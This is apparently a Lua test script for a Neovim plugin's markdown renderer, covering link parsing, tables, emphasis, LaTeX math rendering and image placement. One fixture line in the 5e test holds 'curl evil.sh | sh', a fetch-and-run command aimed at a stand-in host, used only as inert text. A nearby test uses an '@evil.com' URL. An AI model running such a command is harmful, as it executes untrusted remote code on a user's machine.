-- Headless verification of the markdown engine.
local here = debug.getinfo(1, "S").source:sub(2)
vim.opt.runtimepath:prepend(vim.fn.fnamemodify(here, ":p:h:h"))
local MD = require("jupynvim.notebook.markdown")
MD.setup_hl()

-- 1. balanced-bracket links: the exact failing case from the HW notebook
local line = 'written"[[link]](https://www.google.com/url?sa=t&opi=899,what%2520are(x))". In this'
local links = MD.find_links(line)
assert(#links == 1, "expected 1 link, got " .. #links)
assert(links[1].text == "[link]", "link text wrong: " .. links[1].text)
assert(links[1].url:find("google.com", 1, true), "url wrong: " .. links[1].url)
assert(links[1].url:sub(-3) == "(x)", "balanced parens in url broken: " .. links[1].url)
print("1. [[link]](url) parses, balanced parens ok")

-- 2. link_at by cursor position + autolink + bare url
local l = MD.link_at(line, links[1].start + 2)
assert(l and l.url:find("google"), "link_at inside link failed")
assert(MD.link_at("see <https://nvim.io> now", 8).url == "https://nvim.io", "autolink link_at failed")
assert(MD.link_at("at https://x.dev/page ok", 5).url:find("x.dev"), "bare url link_at failed")
print("2. link_at: link/autolink/bare-url ok")

-- 3. rendered extmarks in a buffer
local buf = vim.api.nvim_create_buf(true, false)
local ns = vim.api.nvim_create_namespace("t")
local content = {
  "# Head",
  'phonetic transcription, "the conversion"[[link]](https://krisp.ai/blog/x). Both letters',
  "| Frame | Feature 1 | Phoneme |",
  "|-------|-----------|---------|",
  "| 0     | v0_1      | /d/     |",
  "| 1     | v1_1      | /i/     |",
  "plain __getitem__ and ~~gone~~ and _soft_ but snake_case_name stays",
  "- [x] done thing",
  "- [ ] todo thing",
  "see <https://neovim.io> too",
}
vim.api.nvim_buf_set_lines(buf, 0, -1, false, content)
MD.render(buf, ns, 0, #content - 1, 80)
local marks = vim.api.nvim_buf_get_extmarks(buf, ns, 0, -1, { details = true })

local function marks_on(row)
  local out = {}
  for _, m in ipairs(marks) do if m[2] == row then table.insert(out, m[4]) end end
  return out
end
local function any(row, pred)
  for _, d in ipairs(marks_on(row)) do if pred(d) then return true end end
  return false
end

-- link row: text styled as link, ](url) concealed, arrow virt
assert(any(1, function(d) return d.hl_group == "JupynvimMdLink" end), "link hl missing")
assert(any(1, function(d)
  return d.virt_text and d.virt_text[1] and d.virt_text[1][1]:find("↗")
end), "link arrow missing")
print("3a. link rendering ok")

-- table: top border above header, boxed overlays over concealed raw rows
assert(any(2, function(d)
  return d.virt_lines and d.virt_lines[1][1][1]:find("┌") and d.virt_lines[1][1][1]:find("┬")
end), "table top border missing")
assert(any(3, function(d)
  return d.virt_text and d.virt_text[1][1]:find("├") and d.virt_text[1][1]:find("┼")
end), "table separator overlay missing")
assert(any(2, function(d)
  return d.virt_text and d.virt_text[1][1]:find("│", 1, true)
    and d.virt_text[1][2] == "JupynvimMdTableHead"
end), "table header overlay missing")
assert(any(4, function(d)
  return d.virt_text and d.virt_text[1][1]:find("│", 1, true)
end), "table body overlay missing")
assert(any(4, function(d) return d.conceal == "" end), "raw table row not concealed")
assert(any(5, function(d)
  if not d.virt_lines then return false end
  for _, vl in ipairs(d.virt_lines) do
    if vl[1][1]:find("└") then return true end
  end
  return false
end), "table bottom border missing")
print("3b. table rendering ok")

-- wide tables: columns shrink and long cells wrap INSIDE, no overflow
local layout = MD._layout_table({
  { "Frame", "Context Vectors" },
  { "0", string.rep("[0, 0, 0] (Padding), ", 12) },
}, 60)
assert(layout, "wide-table layout failed")
local function w(s) return vim.fn.strdisplaywidth(s) end
assert(w(layout.top) <= 60, "top border too wide: " .. w(layout.top))
assert(#layout.body[1] > 1, "long cell did not wrap to multiple lines")
for _, ln in ipairs(layout.body[1]) do
  assert(w(ln) <= 60, "body line too wide: " .. w(ln))
end
assert(w(layout.header[1]) == w(layout.top), "header width != border width")
print("3b2. wide-table wrapping ok")

-- emphasis: __bold__, ~~strike~~, _em_, snake_case untouched
assert(any(6, function(d) return d.hl_group == "JupynvimMdBold" end), "__bold__ missing")
assert(any(6, function(d) return d.hl_group == "JupynvimMdStrike" end), "~~strike~~ missing")
assert(any(6, function(d) return d.hl_group == "JupynvimMdEm" end), "_em_ missing")
for _, m in ipairs(marks) do
  if m[2] == 6 and m[4].hl_group == "JupynvimMdEm" then
    local span = content[7]:sub(m[3] + 1, m[4].end_col)
    assert(span == "soft", "emphasis leaked: styled span [" .. span .. "]")
  end
end
print("3c. emphasis ok")

-- task lists
assert(any(7, function(d)
  return d.virt_text and d.virt_text[1][1] == "☑"
end), "checked box missing")
assert(any(8, function(d)
  return d.virt_text and d.virt_text[1][1] == "☐"
end), "unchecked box missing")
print("3d. task lists ok")

-- autolink styled
assert(any(9, function(d) return d.hl_group == "JupynvimMdLink" end), "autolink hl missing")
print("3e. autolink ok")

-- 4. math: span detection, inline marks, display blocks
local function spans(s) return (MD.find_math_spans(s)) end
assert(#spans("costs $5 and $10 each") == 0, "currency became math")
assert(spans("to split $100 in half, we calculate $100/2$")[1].inner == "100/2", "$100/2$ not found")
assert(#spans("`$HOME` and `$x$`") == 0, "math found inside code spans")
assert(spans("$\\$4 + x$")[1].inner == "\\$4 + x", "escaped dollar inside math broke the span")
assert(#spans("$a$$b$") == 2, "$a$$b$ should be two spans")
assert(spans("a $$x$$ b")[1].display == true, "$$x$$ should be display")
assert(spans("\\(x\\)")[1].inner == "x", "\\(x\\) inner wrong")
assert(spans("$`\\sqrt{2}`$")[1].inner == "\\sqrt{2}", "backtick form inner wrong")
print("4a. find_math_spans ok")

local mbuf = vim.api.nvim_create_buf(true, false)
local mcontent = {
  "inline $x^2$ here and $I_0 e^{t/\\text{tc}}$ end",   -- 0
  "costs $5 and $10 each",                               -- 1
  "code `$x$` stays and \\$5 is text",                   -- 2
  "\\(a_1\\) and $a$$b$",                                -- 3
  "math $a_1 * b_2$ no *em* inside",                     -- 4
  "$$E = mc^2$$",                                        -- 5
  "$$",                                                  -- 6
  "\\frac{a}{b} \\\\",                                   -- 7
  "\\begin{pmatrix} 1 & 0 \\\\ 0 & 1 \\end{pmatrix}",    -- 8
  "$$",                                                  -- 9
  "\\[",                                                 -- 10
  "\\int_0^1 x^2\\,dx",                                  -- 11
  "\\]",                                                 -- 12
  "```math",                                             -- 13
  "\\sqrt{2}",                                           -- 14
  "```",                                                 -- 15
}
vim.api.nvim_buf_set_lines(mbuf, 0, -1, false, mcontent)
MD.render(mbuf, ns, 0, #mcontent - 1, 80)
marks = vim.api.nvim_buf_get_extmarks(mbuf, ns, 0, -1, { details = true })

local function vt(d) return d.virt_text and d.virt_text[1] and d.virt_text[1][1] end
local function math_marks(row)
  local out = {}
  for _, d in ipairs(marks_on(row)) do
    if d.conceal == "" and d.virt_text_pos == "inline" and d.virt_text
       and (d.virt_text[1][2] == "JupynvimMdMath" or d.virt_text[1][2] == "JupynvimMdMathBlock") then
      table.insert(out, d)
    end
  end
  return out
end
local function has_vt(row, text)
  return any(row, function(d) return vt(d) == text and d.conceal == "" end)
end
for _, m in ipairs(marks) do
  assert(not (m[4].virt_text_pos == "overlay" and m[4].virt_text
    and m[4].virt_text[1][2]:find("Math", 1, true)), "math drawn as overlay on row " .. m[2])
end

local r0 = math_marks(0)
assert(#r0 == 2, "row 0: expected 2 math marks, got " .. #r0)
assert(has_vt(0, "x²") and has_vt(0, "I₀ e^(t/tc)"), "row 0: inline renderings wrong")
for _, d in ipairs(r0) do assert(d.virt_text[1][2] == "JupynvimMdMath", "row 0: wrong hl") end
assert(not any(1, function(d) return d.virt_text ~= nil end), "row 1: currency got virt_text")
assert(#math_marks(2) == 0, "row 2: math inside code span")
local bs = mcontent[3]:find("\\$", 1, true)
assert(any(2, function(d)
  return d.conceal == "" and d.end_col == bs and not d.virt_text
end), "row 2: backslash of \\$ not concealed")
for _, d in ipairs(marks) do
  if d[2] == 2 and d[4].conceal == "" and d[4].end_col == bs then
    assert(d[3] == bs - 1, "row 2: escape conceal not 1 byte")
  end
end
local r3 = math_marks(3)
assert(#r3 == 3, "row 3: expected 3 math marks, got " .. #r3)
assert(has_vt(3, "a₁") and has_vt(3, "a") and has_vt(3, "b"), "row 3: renderings wrong")
local ms, me = mcontent[5]:find("$a_1 * b_2$", 1, true)
for _, m in ipairs(marks) do
  if m[2] == 4 and m[4].hl_group == "JupynvimMdEm" then
    assert(m[3] + 1 > me or m[4].end_col < ms, "row 4: emphasis fired inside math")
  end
end
assert(any(4, function(d) return d.hl_group == "JupynvimMdEm" end), "row 4: *em* after math lost")
assert(any(5, function(d)
  return d.end_col == #mcontent[6] and d.conceal == "" and vt(d) == "E = mc²"
    and d.line_hl_group == "JupynvimMdMathBlock"
end), "row 5: single-line $$ block wrong")
assert(has_vt(7, "a/b") and has_vt(8, "(1 0; 0 1)"), "$$ block inner rows wrong")
for _, row in ipairs({ 6, 9, 10, 12 }) do
  assert(any(row, function(d) return d.line_hl_group == "JupynvimMdMathBlock" end),
    "row " .. row .. ": block delimiter line_hl missing")
  assert(not any(row, function(d) return d.virt_text ~= nil end),
    "row " .. row .. ": block delimiter got virt_text")
end
assert(has_vt(11, "∫₀¹ x² dx"), "\\[ block middle row wrong")
assert(has_vt(14, "√2"), "```math fence row wrong")
print("4b. math marks ok")

-- smoke: the whole markdown fixture renders and scans without errors
local fixture = vim.fn.fnamemodify(here, ":p:h") .. "/fixtures/markdown/md-fixture.md"
local flines = vim.fn.readfile(fixture)
assert(#flines > 0, "fixture missing: " .. fixture)
local fbuf = vim.api.nvim_create_buf(true, false)
vim.api.nvim_buf_set_lines(fbuf, 0, -1, false, flines)
local ok, err = pcall(MD.render, fbuf, ns, 0, #flines - 1, 80)
assert(ok, "fixture render failed: " .. tostring(err))
for n, fl in ipairs(flines) do
  local sok, serr = pcall(MD.find_math_spans, fl)
  assert(sok, "find_math_spans failed on fixture line " .. n .. ": " .. tostring(serr))
end
print("4c. md-fixture smoke ok")

-- 5. review fixes: perf bounds, block closers, link_at vs math, fallbacks
local function render_lines(ls)
  local b = vim.api.nvim_create_buf(true, false)
  vim.api.nvim_buf_set_lines(b, 0, -1, false, ls)
  local t0 = vim.uv.hrtime()
  MD.render(b, ns, 0, #ls - 1, 80)
  local dt = (vim.uv.hrtime() - t0) / 1e6
  return b, dt, vim.api.nvim_buf_get_extmarks(b, ns, 0, -1, { details = true })
end
local function row_marks(ms, row)
  local out = {}
  for _, m in ipairs(ms) do if m[2] == row then out[#out + 1] = m end end
  return out
end

-- A/B/C: pathological single lines stay near-linear (fixed: a few ms)
for _, case in ipairs({
  { "A in_math guard", string.rep("$a$*b*", 20000) },
  { "B link/span filter", string.rep("[a](b)$c$", 20000) },
  { "C unclosed \\(", string.rep("\\(", 20000) },
  { "C unclosed \\\\(", string.rep("\\\\(", 20000) },
  { "C unclosed $$", string.rep("$$a", 20000) },
  { "C distinct ` runs", (function()
      local parts = {}
      for i = 1, 400 do parts[i] = string.rep("`", i) end
      return table.concat(parts, " ")
    end)() },
}) do
  local b, dt = render_lines({ case[2] })
  assert(dt < 1000, ("5. %s took %.0f ms"):format(case[1], dt))
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5a. perf bounds ok")

-- D: \] closes even with text after it; the following heading still renders
do
  local ls = { "\\[", "x^2", "\\] so it", "# Heading" }
  local b, _, ms = render_lines(ls)
  local head = false
  for _, m in ipairs(row_marks(ms, 3)) do
    if m[4].line_hl_group == "JupynvimMdH1" then head = true end
  end
  assert(head, "5. heading after `\\] so it` lost (block never closed)")
  for _, m in ipairs(row_marks(ms, 2)) do
    if m[4].conceal == "" then
      assert(m[3] == 0 and m[4].end_col == 2, "5. \\] closer conceal should end at the delimiter")
    end
  end
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5b. \\] closer with trailing text ok")

-- E: prose after a closer stays visible
do
  local ls = { "$$", "a", "x^2 $$ trailing prose", "$$", "b", "$$ then prose", "end" }
  local b, _, ms = render_lines(ls)
  local function closer(row)
    for _, m in ipairs(row_marks(ms, row)) do
      if m[4].conceal == "" then return m end
    end
  end
  local c2 = closer(2)
  assert(c2 and c2[3] == 0 and c2[4].end_col == #"x^2 $$", "5. closer conceal must end at $$")
  assert(c2[4].virt_text and c2[4].virt_text[1][1] == "x²", "5. math before closer not rendered")
  local c5 = closer(5)
  assert(c5 and c5[4].end_col == 2 and not c5[4].virt_text, "5. bare $$ closer conceal wrong")
  local win = vim.api.nvim_open_win(b, true, { relative = "editor", row = 0, col = 0, width = 60, height = 10 })
  vim.wo[win].conceallevel = 2
  vim.wo[win].concealcursor = "nc"
  vim.api.nvim_win_set_cursor(win, { 7, 0 })
  vim.cmd("redraw")
  local function screen_row(r)
    local pos = vim.fn.screenpos(win, r, 1)
    local out = {}
    for c = 1, 40 do out[#out + 1] = vim.fn.screenstring(pos.row, c) end
    return table.concat(out)
  end
  local s3, s6 = screen_row(3), screen_row(6)
  assert(s3:find("x² trailing prose", 1, true), "5. screen row 3: [" .. s3 .. "]")
  assert(s6:find("then prose", 1, true), "5. screen row 6: [" .. s6 .. "]")
  vim.api.nvim_win_close(win, true)
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5c. prose after block closers visible ok")

-- F: link_at never returns a URL that math hides
do
  local ln = "see $https://good.com%2F@evil.com$ now"
  for col = 1, #ln do
    local got = MD.link_at(ln, col)
    assert(got == nil or not got.url:find("evil", 1, true),
      "5. link_at returned in-math url at col " .. col)
  end
  assert(MD.link_at("see <https://nvim.io> now", 8).url == "https://nvim.io", "5. autolink broke")
  assert(MD.link_at("$x$ at https://x.dev/page ok", 9).url:find("x.dev"), "5. bare url after math broke")
end
print("5d. link_at ignores urls inside math ok")

-- G: a block line rendering to "" shows its trimmed source
do
  local ls = { "$$", "  % curl evil.sh | sh  ", "\\label{x}", "$$" }
  local b, _, ms = render_lines(ls)
  local function vt_of(row)
    for _, m in ipairs(row_marks(ms, row)) do
      if m[4].virt_text then return m[4].virt_text[1][1], m[4].virt_text[1][2] end
    end
  end
  local t1, h1 = vt_of(1)
  assert(t1 == "  % curl evil.sh | sh" and h1 == "JupynvimMdMathBlock", "5. % line vanished: " .. tostring(t1))
  assert(vt_of(2) == "\\label{x}", "5. \\label line vanished")
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5e. empty block renderings fall back to source ok")

-- J: one-line bare environment
do
  local ln = "\\begin{equation} x^2 \\end{equation}"
  local sp = MD.find_math_spans(ln)
  assert(#sp == 1 and sp[1].display and sp[1].start == 1 and sp[1].stop == #ln, "5. bare env span wrong")
  local b, _, ms = render_lines({ ln, "after \\begin{align}a\\end{align} text" })
  local ok0, ok1 = false, false
  for _, m in ipairs(row_marks(ms, 0)) do
    if m[4].virt_text and m[4].virt_text[1][1] == "x²" and m[4].conceal == "" then ok0 = true end
  end
  for _, m in ipairs(row_marks(ms, 1)) do
    if m[4].virt_text and m[4].virt_text[1][1] == "a" and m[4].conceal == "" then ok1 = true end
  end
  assert(ok0, "5. one-line equation env not rendered as x²")
  assert(ok1, "5. inline bare env not rendered")
  vim.api.nvim_buf_delete(b, { force = true })
end
print("5f. one-line bare environment ok")

-- 6. display math offered to a ctx (math_block) and placed as an image.
-- A fake ctx records every call and answers from a function of the TeX.
local function fake_ctx(answer, extra)
  local calls = {}
  local ctx = {
    align = "left",
    math_block = function(tex, spec)
      calls[#calls + 1] = { tex, spec }
      return answer(tex)
    end,
  }
  for k, v in pairs(extra or {}) do ctx[k] = v end
  return ctx, calls
end
local function never() return nil end
local function image(R, C)
  local text = {}
  for r = 1, R do text[r] = "r" .. r end
  return { rows = R, cols = C or 10, hl = "TestPH", text = text }
end
-- `ls` in a new buffer, rendered from row `from` (default 0) with `ctx`
local function render_ctx(ls, ctx, width, from)
  local b = vim.api.nvim_create_buf(true, false)
  vim.api.nvim_buf_set_lines(b, 0, -1, false, ls)
  MD.render(b, ns, from or 0, #ls - 1, width or 80, ctx)
  return b, vim.api.nvim_buf_get_extmarks(b, ns, 0, -1, { details = true })
end
-- the marks as a sorted list of "row:col:details" (ids left out)
local function mark_list(ms)
  local out = {}
  for _, m in ipairs(ms) do out[#out + 1] = ("%d:%d:%s"):format(m[2], m[3], vim.inspect(m[4])) end
  table.sort(out)
  return out
end
local function same_marks(a, b)
  if #a ~= #b then return false, ("%d marks against %d"):format(#a, #b) end
  for i = 1, #a do
    if a[i] ~= b[i] then return false, "first difference: " .. a[i] .. "  vs  " .. b[i] end
  end
  return true
end
-- the text rendering of `ls`, without a ctx
local function text_marks(ls, width, from)
  local b, ms = render_ctx(ls, nil, width, from)
  vim.api.nvim_buf_delete(b, { force = true })
  return mark_list(ms)
end

-- 6a. identity: a ctx that always answers nil gives exactly the marks of no ctx
local every_kind = {
  "# Blocks of every kind",
  "$$", "x^2", "$$",
  "$$ a", "b", "c $$",
  "\\[", "\\int_0^1 f", "\\]",
  "\\\\[", "y", "\\\\]",
  "\\begin{align}", "a &= b \\\\", "c &= d", "\\end{align}",
  "```math", "\\sqrt{2}", "```",
  "~~~math", "\\frac{1}{2}", "~~~",
  "$$x$$", "  \\[x\\]", "\\begin{equation}x\\end{equation}",
  "$$", "z", "$$ then prose",
  "$$", "| a | b |", "|---|---|", "| 1 | 2 |", "$$",
  "$$", "```", "code", "```", "$$",
  "$$", "```math", "w", "```", "$$",
  "> $$", "- $$x$$", "text $$x$$ text", "inline $x$ and \\(y\\)",
  "```python", "print(1)", "```",
  "| h | k |", "|---|---|", "| 1 | 2 |",
  "heading", "---",
  "$$", "never closed",
}
do
  local ctx, calls = fake_ctx(never)
  local b, ms = render_ctx(every_kind, ctx)
  local ok, why = same_marks(mark_list(ms), text_marks(every_kind))
  assert(ok, "6a. a ctx answering nil changed the marks: " .. tostring(why))
  vim.api.nvim_buf_delete(b, { force = true })
  local want = {
    "x^2", " a\nb\nc ", "\\int_0^1 f", "y", "\\begin{align}\na &= b \\\\\nc &= d\n\\end{align}",
    "\\sqrt{2}", "\\frac{1}{2}", "x", "x", "\\begin{equation}x\\end{equation}",
  }
  local got = {}
  for i, c in ipairs(calls) do got[i] = c[1] end
  assert(#got == #want, "6a. asked " .. #got .. " blocks, want " .. #want .. ": " .. vim.inspect(got))
  for i = 1, #want do
    assert(got[i] == want[i], ("6a. ask %d: %q, want %q"):format(i, got[i], want[i]))
  end
  -- the sections above, and the whole markdown fixture, the same way
  for name, ls in pairs({ section4 = mcontent, fixture = flines, section3 = content }) do
    local fctx = fake_ctx(never)
    local fb, fms = render_ctx(ls, fctx)
    local same, fwhy = same_marks(mark_list(fms), text_marks(ls))
    assert(same, "6a. " .. name .. ": a ctx answering nil changed the marks: " .. tostring(fwhy))
    vim.api.nvim_buf_delete(fb, { force = true })
  end
  -- a ctx without math_block, or not a table, is no ctx
  for _, bad in ipairs({ {}, { math_block = true }, 42 }) do
    local bb, bms = render_ctx(every_kind, bad)
    assert(same_marks(mark_list(bms), text_marks(every_kind)), "6a. a ctx with no math_block changed the marks")
    vim.api.nvim_buf_delete(bb, { force = true })
  end
end
print("6a. a ctx answering nil keeps the text rendering, mark for mark ok")

-- 6b. what is asked: the TeX and the spec
local function asks(ls, width, from)
  local ctx, calls = fake_ctx(never)
  local b = render_ctx(ls, ctx, width, from)
  vim.api.nvim_buf_delete(b, { force = true })
  return calls
end
local function spec_is(c, first, last, indent, width, what)
  local s = c[2]
  assert(s.first == first and s.last == last and s.indent == indent and s.width == width,
    ("6b. %s: spec %s, want first %d last %d indent %d width %d"):format(
      what, vim.inspect(s), first, last, indent, width))
end
do
  local c = asks({ "intro", "$$", "x", "$$" })
  assert(#c == 1 and c[1][1] == "x", "6b. $$ / x / $$ asked " .. vim.inspect(c))
  spec_is(c[1], 1, 3, 0, 80, "$$ / x / $$")
  c = asks({ "$$a", "b", "c$$" })
  assert(#c == 1 and c[1][1] == "a\nb\nc", "6b. $$a / b / c$$ asked " .. vim.inspect(c))
  -- the text next to the delimiters is kept as it is (a trailing `\ ` is TeX)
  c = asks({ "$$ a", "b", "c $$" })
  assert(#c == 1 and c[1][1] == " a\nb\nc ", "6b. $$ a / b / c $$ asked " .. vim.inspect(c))
  spec_is(c[1], 0, 2, 0, 80, "$$ a / b / c $$")
  c = asks({ "\\[", "x", "\\]" })
  assert(#c == 1 and c[1][1] == "x", "6b. \\[ / x / \\] asked " .. vim.inspect(c))
  spec_is(c[1], 0, 2, 0, 80, "\\[ block")
  c = asks({ "\\\\[", "x", "\\\\]" })
  assert(#c == 1 and c[1][1] == "x", "6b. \\\\[ / x / \\\\] asked " .. vim.inspect(c))
  c = asks({ "\\begin{align}", "a &= b", "\\end{align}" })
  assert(#c == 1 and c[1][1] == "\\begin{align}\na &= b\n\\end{align}",
    "6b. align asked " .. vim.inspect(c))
  spec_is(c[1], 0, 2, 0, 80, "align")
  c = asks({ "```math", "\\sqrt{2}", "```" })
  assert(#c == 1 and c[1][1] == "\\sqrt{2}", "6b. ```math asked " .. vim.inspect(c))
  spec_is(c[1], 0, 2, 0, 80, "```math")
  c = asks({ "~~~math", "a", "b", "~~~" })
  assert(#c == 1 and c[1][1] == "a\nb", "6b. ~~~math asked " .. vim.inspect(c))
  c = asks({ "$$x$$", "\\[x\\]", "\\begin{equation}x\\end{equation}" })
  assert(#c == 3, "6b. three one-line blocks asked " .. #c .. " times")
  assert(c[1][1] == "x" and c[2][1] == "x" and c[3][1] == "\\begin{equation}x\\end{equation}",
    "6b. one-line blocks asked " .. vim.inspect(c))
  for i = 1, 3 do spec_is(c[i], i - 1, i - 1, 0, 80, "one-line block " .. i) end
  c = asks({ "   $$", "   x", "   $$" })
  spec_is(c[1], 0, 2, 3, 80, "indented $$ block")
  c = asks({ "  $$x$$" })
  spec_is(c[1], 0, 0, 2, 80, "indented one-line block")
  c = asks({ "a", "b", "$$", "x", "$$" }, 60, 2)
  assert(#c == 1, "6b. a range from row 2 asked " .. #c .. " times")
  spec_is(c[1], 2, 4, 0, 60, "a range from row 2")
  c = asks({ "$$", "x", "$$" }, nil)
  spec_is(c[1], 0, 2, 0, 80, "no width")
end
print("6b. what is asked: TeX, rows, indent, width ok")

-- 6c. what is never asked; each stays the text rendering
do
  for _, ls in ipairs({
    { "$$", "x", "$$ and prose" },
    { "\\[", "x", "\\] so it" },
    { "\\begin{equation}", "x", "\\end{equation} text" },
    { "$$", "x" },
    { "\\begin{align}", "x" },
    { "```math", "x" },
    { "$$", "| a | b |", "|---|---|", "$$" },
    { "$$", "```", "x", "```", "$$" },
    { "$$", "", "$$" },
    { "\\[ \\]" },
    { "> $$x$$" },
    { "> $$", "> x", "> $$" },
    { "- $$x$$" },
    { "1. $$x$$" },
    { "text $$x$$ text" },
    { "inline $x$ here" },
    { "\\(x\\)" },
    { "$$x$$", "---" },
  }) do
    local ctx, calls = fake_ctx(function() return image(1) end)
    local b, ms = render_ctx(ls, ctx)
    assert(#calls == 0, "6c. asked for " .. vim.inspect(ls) .. ": " .. vim.inspect(calls))
    assert(same_marks(mark_list(ms), text_marks(ls)), "6c. marks changed for " .. vim.inspect(ls))
    vim.api.nvim_buf_delete(b, { force = true })
  end
end
print("6c. never asked: prose after closer, unclosed, table or fence inside, quote, list, paragraph, inline ok")

-- 6d. placement, mark by mark. The calls are recorded as they are made, so
-- what nvim_buf_get_extmarks does not return (priority) is checked too.
local function placed(ls, R, opts)
  opts = opts or {}
  local rec = {}
  local real = vim.api.nvim_buf_set_extmark
  vim.api.nvim_buf_set_extmark = function(b, n, row, col, o)
    rec[#rec + 1] = { row = row, col = col, o = o }
    return real(b, n, row, col, o)
  end
  local ctx, calls = fake_ctx(function() return image(R, opts.cols) end,
    { align = opts.align, overlay = opts.overlay })
  local ok, b = pcall(render_ctx, ls, ctx, opts.width or 80)
  vim.api.nvim_buf_set_extmark = real
  assert(ok, b)
  vim.api.nvim_buf_delete(b, { force = true })
  assert(#calls == 1, "6d. asked " .. #calls .. " times for " .. vim.inspect(ls))
  local k = { conceal = {}, overlay = {}, below = {}, above = {}, other = {} }
  for _, m in ipairs(rec) do
    local o = m.o
    -- no text marks under an image: nothing inline, no line highlight
    assert(o.virt_text_pos ~= "inline" and o.line_hl_group == nil,
      "6d. a text mark under an image: " .. vim.inspect(m))
    assert(m.col == 0, "6d. a mark not at column 0: " .. vim.inspect(m))
    if o.conceal ~= nil then k.conceal[#k.conceal + 1] = m
    elseif o.virt_text_pos == "overlay" then k.overlay[#k.overlay + 1] = m
    elseif o.virt_lines and o.virt_lines_above then k.above[#k.above + 1] = m
    elseif o.virt_lines then k.below[#k.below + 1] = m
    else k.other[#k.other + 1] = m end
  end
  assert(#k.other == 0, "6d. unexpected marks: " .. vim.inspect(k.other))
  -- every non-empty source line concealed whole, at priority 150
  local want_conceal = 0
  for i, l in ipairs(ls) do
    if #l > 0 then
      want_conceal = want_conceal + 1
      local found = false
      for _, m in ipairs(k.conceal) do
        if m.row == i - 1 then
          assert(m.o.end_col == #l and m.o.conceal == "" and m.o.priority == 150,
            "6d. conceal of row " .. (i - 1) .. " wrong: " .. vim.inspect(m))
          found = true
        end
      end
      assert(found, "6d. row " .. (i - 1) .. " not concealed")
    end
  end
  assert(#k.conceal == want_conceal, "6d. " .. #k.conceal .. " conceal marks, want " .. want_conceal)
  return k
end
local function overlay_ok(m, row, chunks, what)
  assert(m.row == row, ("6d. %s: overlay on row %d, want %d"):format(what, m.row, row))
  assert(m.o.virt_text_pos == "overlay" and m.o.hl_mode == "replace" and m.o.priority == 160,
    "6d. " .. what .. ": overlay options wrong: " .. vim.inspect(m.o))
  assert(vim.deep_equal(m.o.virt_text, chunks),
    "6d. " .. what .. ": chunks " .. vim.inspect(m.o.virt_text) .. ", want " .. vim.inspect(chunks))
end
local function rows_of(vls)
  local out = {}
  for i, vl in ipairs(vls) do out[i] = vl[#vl][1] end
  return table.concat(out, ",")
end
do
  -- S 3, R 1: the row over the middle line, no virtual lines
  local k = placed({ "$$", "x", "$$" }, 1)
  assert(#k.overlay == 1 and #k.below == 0 and #k.above == 0, "6d. S3 R1: " .. vim.inspect(k))
  overlay_ok(k.overlay[1], 1, { { "r1", "TestPH" } }, "S3 R1")
  -- S 3, R 3: one row over each line, in order
  k = placed({ "\\[", "\\frac{a}{b}", "\\]" }, 3)
  assert(#k.overlay == 3 and #k.below == 0 and #k.above == 0, "6d. S3 R3: " .. vim.inspect(k))
  table.sort(k.overlay, function(a, b) return a.row < b.row end)
  for r = 1, 3 do overlay_ok(k.overlay[r], r - 1, { { "r" .. r, "TestPH" } }, "S3 R3 row " .. r) end
  -- S 1, R 3: one row over the line, two virtual lines under it
  k = placed({ "$$\\frac{a}{b}$$" }, 3)
  assert(#k.overlay == 1 and #k.below == 1 and #k.above == 0, "6d. S1 R3: " .. vim.inspect(k))
  overlay_ok(k.overlay[1], 0, { { "r1", "TestPH" } }, "S1 R3")
  local below = k.below[1]
  assert(below.row == 0 and not below.o.virt_lines_above and not below.o.virt_lines_leftcol
    and rows_of(below.o.virt_lines) == "r2,r3", "6d. S1 R3 virtual lines wrong: " .. vim.inspect(below))
  -- S 5, R 2: rows over lines 2 and 3, centred
  k = placed({ "$$", "a", "b", "c", "$$" }, 2)
  assert(#k.overlay == 2 and #k.below == 0 and #k.above == 0, "6d. S5 R2: " .. vim.inspect(k))
  table.sort(k.overlay, function(a, b) return a.row < b.row end)
  overlay_ok(k.overlay[1], 1, { { "r1", "TestPH" } }, "S5 R2 first")
  overlay_ok(k.overlay[2], 2, { { "r2", "TestPH" } }, "S5 R2 second")
  -- an empty line inside the block takes a row like any other
  k = placed({ "$$", "", "x", "$$" }, 1)
  assert(#k.overlay == 1, "6d. S4 R1: " .. vim.inspect(k))
  overlay_ok(k.overlay[1], 1, { { "r1", "TestPH" } }, "S4 R1 (empty line)")
  -- a 200-character line at width 80 wraps: every row above the block
  k = placed({ "$$", string.rep("x", 200), "$$" }, 2)
  assert(#k.overlay == 0 and #k.below == 0 and #k.above == 1, "6d. wide line: " .. vim.inspect(k))
  assert(k.above[1].row == 0 and rows_of(k.above[1].o.virt_lines) == "r1,r2",
    "6d. wide line: virtual lines above wrong: " .. vim.inspect(k.above[1]))
  -- an indented block starts at its indent
  k = placed({ "  $$", "  x", "  $$" }, 1)
  overlay_ok(k.overlay[1], 1, { { "  ", "Normal" }, { "r1", "TestPH" } }, "indented")
  k = placed({ "  $$x$$" }, 2)
  overlay_ok(k.overlay[1], 0, { { "  ", "Normal" }, { "r1", "TestPH" } }, "indented one-line")
  assert(vim.deep_equal(k.below[1].o.virt_lines, { { { "  ", "Normal" }, { "r2", "TestPH" } } }),
    "6d. indented one-line: virtual line chunks wrong: " .. vim.inspect(k.below[1]))
  -- align = "center", width 80, 20 columns: a pad of 30
  k = placed({ "$$", "x", "$$" }, 1, { align = "center", cols = 20, width = 80 })
  overlay_ok(k.overlay[1], 1, { { string.rep(" ", 30), "Normal" }, { "r1", "TestPH" } }, "center")
  -- centred, but never left of the indent
  k = placed({ string.rep(" ", 40) .. "$$x$$" }, 1, { align = "center", cols = 20, width = 80 })
  overlay_ok(k.overlay[1], 0, { { string.rep(" ", 40), "Normal" }, { "r1", "TestPH" } }, "center, deep indent")
  -- overlay = false: every source line concealed, all rows above the first
  k = placed({ "$$", "x", "$$" }, 1, { overlay = false })
  assert(#k.overlay == 0 and #k.below == 0 and #k.above == 1, "6d. no overlay S3 R1: " .. vim.inspect(k))
  assert(k.above[1].row == 0 and rows_of(k.above[1].o.virt_lines) == "r1",
    "6d. no overlay S3 R1: virtual lines wrong: " .. vim.inspect(k.above[1]))
  k = placed({ "$$\\frac{a}{b}$$" }, 3, { overlay = false })
  assert(#k.overlay == 0 and #k.below == 0 and #k.above == 1, "6d. no overlay S1 R3: " .. vim.inspect(k))
  assert(k.above[1].row == 0 and rows_of(k.above[1].o.virt_lines) == "r1,r2,r3",
    "6d. no overlay S1 R3: virtual lines wrong: " .. vim.inspect(k.above[1]))
  -- overlay = true is the default
